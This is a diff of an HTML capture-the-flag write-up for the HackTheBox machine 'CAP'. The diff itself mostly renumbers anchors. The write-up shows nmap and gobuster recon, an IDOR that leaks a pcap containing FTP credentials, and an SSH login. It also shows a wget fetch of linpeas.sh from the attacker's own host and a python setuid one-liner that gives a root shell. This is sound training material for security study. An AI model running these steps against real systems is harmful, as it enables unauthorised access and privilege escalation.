@@ -1,10 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-04-15 Fri 15:51 -->
+<!-- 2022-07-25 Mon 19:29 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | CAP</title>
+<meta name="author" content="Main user for my machines" />
 <meta name="generator" content="Org Mode" />
 <link rel="stylesheet" type="text/css" href="static/style.css" />
 <script>
@@ -42,37 +43,37 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#orge2182d0">1. Introduction</a></li>
-<li><a href="#orgbd870e7">2. Recon</a>
+<li><a href="#orgf11a613">1. Introduction</a></li>
+<li><a href="#org35f0e1d">2. Recon</a>
 <ul>
-<li><a href="#org0a92d6f">2.1. Nmap</a></li>
-<li><a href="#org1b69194">2.2. Web enum</a>
+<li><a href="#orgf1c313e">2.1. Nmap</a></li>
+<li><a href="#org0fbaaea">2.2. Web enum</a>
 <ul>
-<li><a href="#org041328c">2.2.1. Gobuster</a></li>
-<li><a href="#orgb384c86">2.2.2. Index</a></li>
-<li><a href="#orgb801e74">2.2.3. Ipconfig</a></li>
-<li><a href="#orgee920e0">2.2.4. Network status</a></li>
-<li><a href="#orga7c8256">2.2.5. Pcap scanning</a></li>
+<li><a href="#orgfb0d5e5">2.2.1. Gobuster</a></li>
+<li><a href="#org873de33">2.2.2. Index</a></li>
+<li><a href="#org8c05c2e">2.2.3. Ipconfig</a></li>
+<li><a href="#orge9cae6d">2.2.4. Network status</a></li>
+<li><a href="#org15c1332">2.2.5. Pcap scanning</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org2e4c2db">3. Exploitation</a>
+<li><a href="#org8958cc8">3. Exploitation</a>
 <ul>
-<li><a href="#orgebb7297">3.1. Pcap analysis</a></li>
-<li><a href="#org09a01a3">3.2. User flag</a></li>
+<li><a href="#org16ca979">3.1. Pcap analysis</a></li>
+<li><a href="#org8468d28">3.2. User flag</a></li>
 </ul>
 </li>
-<li><a href="#org7d07dd8">4. Priv esc</a>
+<li><a href="#orgc9b5a1d">4. Priv esc</a>
 <ul>
-<li><a href="#orgd75ba03">4.1. Root flag</a></li>
+<li><a href="#org8a84850">4.1. Root flag</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </nav>
-<div id="outline-container-orge2182d0" class="outline-2">
-<h2 id="orge2182d0"><span class="section-number-2">1.</span> Introduction</h2>
+<div id="outline-container-orgf11a613" class="outline-2">
+<h2 id="orgf11a613"><span class="section-number-2">1.</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
 Welcome my write-up for hackthebox machine called CAP.<br>
@@ -82,21 +83,21 @@ I did this box together with my buddy <code>Hestenettet</code>, during a trip to
 </p>
 </div>
 </div>
-<div id="outline-container-orgbd870e7" class="outline-2">
-<h2 id="orgbd870e7"><span class="section-number-2">2.</span> Recon</h2>
+<div id="outline-container-org35f0e1d" class="outline-2">
+<h2 id="org35f0e1d"><span class="section-number-2">2.</span> Recon</h2>
 <div class="outline-text-2" id="text-2">
 <p>
 As always we need to get to know the machine, before we can exploit it.<br>
 I'll start by running an nmap scan, which shows a webserver running that I will enumerate manually.<br>
 </p>
 </div>
-<div id="outline-container-org0a92d6f" class="outline-3">
-<h3 id="org0a92d6f"><span class="section-number-3">2.1.</span> Nmap</h3>
+<div id="outline-container-orgf1c313e" class="outline-3">
+<h3 id="orgf1c313e"><span class="section-number-3">2.1.</span> Nmap</h3>
 <div class="outline-text-3" id="text-2-1">
 <p>
 Below is the result from the <code>nmap</code> scan.<br>
 </p>
-<pre class="example" id="org38b764f">
+<pre class="example" id="org12d1850">
 # Nmap 7.92 scan initiated Fri Oct  1 21:44:13 2021 as: nmap -sV -sC -O -oA nmap 10.129.231.0
 Nmap scan report for 10.129.231.0
 Host is up (0.051s latency).
@@ -236,20 +237,20 @@ As you can see, there are three services running on the box.<br>
 </div>
 </div>
 
-<div id="outline-container-org1b69194" class="outline-3">
-<h3 id="org1b69194"><span class="section-number-3">2.2.</span> Web enum</h3>
+<div id="outline-container-org0fbaaea" class="outline-3">
+<h3 id="org0fbaaea"><span class="section-number-3">2.2.</span> Web enum</h3>
 <div class="outline-text-3" id="text-2-2">
 <p>
 Let's first start by running <code>gobuster</code>.<br>
 </p>
 </div>
-<div id="outline-container-org041328c" class="outline-4">
-<h4 id="org041328c"><span class="section-number-4">2.2.1.</span> Gobuster</h4>
+<div id="outline-container-orgfb0d5e5" class="outline-4">
+<h4 id="orgfb0d5e5"><span class="section-number-4">2.2.1.</span> Gobuster</h4>
 <div class="outline-text-4" id="text-2-2-1">
 <p>
 For the dir scan, I used the <code>raft-small-words.txt</code> wordlists found in SecLists.<br>
 </p>
-<pre class="example" id="orga86dc74">
+<pre class="example" id="orgc0a4cb3">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/cap ]
 └─&gt; $ gobuster dir -u "http://cap.htb" -w $REPOS/SecLists/Discovery/Web-Content/raft-small-words.txt             21:52
 ===============================================================
@@ -279,14 +280,14 @@ This didn't really give that much, so let us browse around the site manually.<br
 </p>
 </div>
 </div>
-<div id="outline-container-orgb384c86" class="outline-4">
-<h4 id="orgb384c86"><span class="section-number-4">2.2.2.</span> Index</h4>
+<div id="outline-container-org873de33" class="outline-4">
+<h4 id="org873de33"><span class="section-number-4">2.2.2.</span> Index</h4>
 <div class="outline-text-4" id="text-2-2-2">
 <p>
 The index page on this box is a dashboard, showing some statistics around security related events on the network.<br>
 </p>
 
-<figure id="org84db682">
+<figure id="orgbf05985">
 <img src="assets/2021-10-04_20-44-20_screenshot.png" alt="2021-10-04_20-44-20_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Frontpage is a dashboard</figcaption>
@@ -303,14 +304,14 @@ On the left there is a menu linking to three other sites:<br>
 </div>
 </div>
 
-<div id="outline-container-orgb801e74" class="outline-4">
-<h4 id="orgb801e74"><span class="section-number-4">2.2.3.</span> Ipconfig</h4>
+<div id="outline-container-org8c05c2e" class="outline-4">
+<h4 id="org8c05c2e"><span class="section-number-4">2.2.3.</span> Ipconfig</h4>
 <div class="outline-text-4" id="text-2-2-3">
 <p>
 There isn't anything anything really interesting, there is the possibility of an internal ip leak.<br>
 So it's worth taking note off.<br>
 </p>
-<pre class="example" id="org6fdfba1">
+<pre class="example" id="org850798e">
 eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
         inet 10.129.231.0  netmask 255.255.0.0  broadcast 10.129.255.255
         inet6 fe80::250:56ff:feb9:ed52  prefixlen 64  scopeid 0x20&lt;link&gt;
@@ -332,13 +333,13 @@ lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
 </div>
 </div>
 
-<div id="outline-container-orgee920e0" class="outline-4">
-<h4 id="orgee920e0"><span class="section-number-4">2.2.4.</span> Network status</h4>
+<div id="outline-container-orge9cae6d" class="outline-4">
+<h4 id="orge9cae6d"><span class="section-number-4">2.2.4.</span> Network status</h4>
 <div class="outline-text-4" id="text-2-2-4">
 <p>
 Again not really anything major here, not something you would want out there open for everyone, but there isn't anything we can exploit from it.<br>
 </p>
-<pre class="example" id="orgbfc9039">
+<pre class="example" id="orgc511bc3">
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name     Timer
 tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1001       34771      -                    off (0.00/0/0)
@@ -464,8 +465,8 @@ And could be used when pivoting to other networks.<br>
 </p>
 </div>
 </div>
-<div id="outline-container-orga7c8256" class="outline-4">
-<h4 id="orga7c8256"><span class="section-number-4">2.2.5.</span> Pcap scanning</h4>
+<div id="outline-container-org15c1332" class="outline-4">
+<h4 id="org15c1332"><span class="section-number-4">2.2.5.</span> Pcap scanning</h4>
 <div class="outline-text-4" id="text-2-2-5">
 <p>
 The <code>/data/&lt;capture attempt&gt;</code> endpoint, shows statistisc from a packet capture of 5 seconds.<br>
@@ -481,7 +482,7 @@ Let's try and see if we can find captures which might contain interesting data.<
 This btw is called an IDOR, or insecure direct object reference.<br>
 </p>
 
-<figure id="orgc244785">
+<figure id="orgaed9db4">
 <img src="assets/2021-10-04_21-13-13_screenshot.png" alt="2021-10-04_21-13-13_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 2: </span>Capture nr. 0</figcaption>
@@ -494,12 +495,12 @@ Looks like we might have gotten something interesting here, let's download this 
 </div>
 </div>
 </div>
-<div id="outline-container-org2e4c2db" class="outline-2">
-<h2 id="org2e4c2db"><span class="section-number-2">3.</span> Exploitation</h2>
+<div id="outline-container-org8958cc8" class="outline-2">
+<h2 id="org8958cc8"><span class="section-number-2">3.</span> Exploitation</h2>
 <div class="outline-text-2" id="text-3">
 </div>
-<div id="outline-container-orgebb7297" class="outline-3">
-<h3 id="orgebb7297"><span class="section-number-3">3.1.</span> Pcap analysis</h3>
+<div id="outline-container-org16ca979" class="outline-3">
+<h3 id="org16ca979"><span class="section-number-3">3.1.</span> Pcap analysis</h3>
 <div class="outline-text-3" id="text-3-1">
 <p>
 The pcap file retreived from the IDOR contains a fair amount of packets, to look closer at those open up <code>wireshark</code>.<br>
@@ -509,7 +510,7 @@ The pcap file retreived from the IDOR contains a fair amount of packets, to look
 Scrolling down shows an FTP stream, instead of looking at each packet individuallly, right click the stream, choose follow then TCP stream.<br>
 Which gives the following exchange:<br>
 </p>
-<pre class="example" id="orgedb3f69">
+<pre class="example" id="orgbe409e8">
 220 (vsFTPd 3.0.3)
 USER nathan
 331 Please specify the password.
@@ -548,13 +549,13 @@ Now that we have a user let's connect to the machine and get user flag!<br>
 </p>
 </div>
 </div>
-<div id="outline-container-org09a01a3" class="outline-3">
-<h3 id="org09a01a3"><span class="section-number-3">3.2.</span> User flag</h3>
+<div id="outline-container-org8468d28" class="outline-3">
+<h3 id="org8468d28"><span class="section-number-3">3.2.</span> User flag</h3>
 <div class="outline-text-3" id="text-3-2">
 <p>
 Let's connect with <code>ssh</code>:<br>
 </p>
-<pre class="example" id="org4738da7">
+<pre class="example" id="orgd35f30f">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/cap ]
 └─&gt; $ ssh nathan@10.129.233.146                                                                                                                                                         21:33
 nathan@10.129.233.146's password: 
@@ -592,7 +593,7 @@ nathan@cap:~$
 <p>
 And read the flag:<br>
 </p>
-<pre class="example" id="orgec4cb15">
+<pre class="example" id="org1a81300">
 nathan@cap:~$ ls
 user.txt
 nathan@cap:~$ cat user.txt 
@@ -601,8 +602,8 @@ e2da0█████████████████████████
 </div>
 </div>
 </div>
-<div id="outline-container-org7d07dd8" class="outline-2">
-<h2 id="org7d07dd8"><span class="section-number-2">4.</span> Priv esc</h2>
+<div id="outline-container-orgc9b5a1d" class="outline-2">
+<h2 id="orgc9b5a1d"><span class="section-number-2">4.</span> Priv esc</h2>
 <div class="outline-text-2" id="text-4">
 <p>
 Now we need to escalate our privileges inorder to get root!<br>
@@ -617,7 +618,7 @@ python -m http.server
 <p>
 Then on the box I used <code>wget</code> to download it:<br>
 </p>
-<pre class="example" id="org9122235">
+<pre class="example" id="org21e3fd3">
 nathan@cap:/dev/shm$ wget http://10.10.17.47:8000/linpeas.sh
 --2021-10-04 19:41:54--  http://10.10.17.47:8000/linpeas.sh
 Connecting to 10.10.17.47:8000... connected.
@@ -633,7 +634,7 @@ linpeas.sh                                      100%[===========================
 <p>
 You can see a snippet results of <code>linpeas.sh</code> below:<br>
 </p>
-<pre class="example" id="org9f19089">
+<pre class="example" id="org8f6e3f6">
 [+] Capabilities
 [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
 Current capabilities:
@@ -663,18 +664,18 @@ Files with capabilities:
 <p>
 If you look closely, you'll see that python has setuid capabilities, which we can use to gain root access with the following command:<br>
 </p>
-<pre class="example" id="org37adcac">
+<pre class="example" id="org6e45fad">
 nathan@cap:~$ python3.8 -xc "import os; os.setuid(0); os.system('/bin/bash')"
 root@cap:~#
 </pre>
 </div>
-<div id="outline-container-orgd75ba03" class="outline-3">
-<h3 id="orgd75ba03"><span class="section-number-3">4.1.</span> Root flag</h3>
+<div id="outline-container-org8a84850" class="outline-3">
+<h3 id="org8a84850"><span class="section-number-3">4.1.</span> Root flag</h3>
 <div class="outline-text-3" id="text-4-1">
 <p>
 Now all we need to do is read the flag:<br>
 </p>
-<pre class="example" id="org3727d33">
+<pre class="example" id="org96b7df2">
 root@cap:~# cd /root/
 root@cap:/root# ls
 root.txt  snap
